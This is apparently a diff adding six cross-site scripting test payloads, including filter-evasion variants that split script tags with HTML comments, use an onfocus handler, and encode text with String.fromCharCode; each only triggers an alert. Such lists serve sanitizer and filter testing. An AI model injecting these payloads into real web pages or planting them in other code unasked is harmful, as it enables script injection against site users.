@@ -1,0 +1,6 @@
+&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+<scr<!--comment-->ipt>alert('XSS')</scr<!--comment-->ipt>
+<input onfocus="alert('XSS')">
+<script>setTimeout(function(){alert('XSS')}, 100);</script>
+<script>alert(String.fromCharCode(88,83,83));</script>
+<script>if(1<2){alert('XSS')}</script>
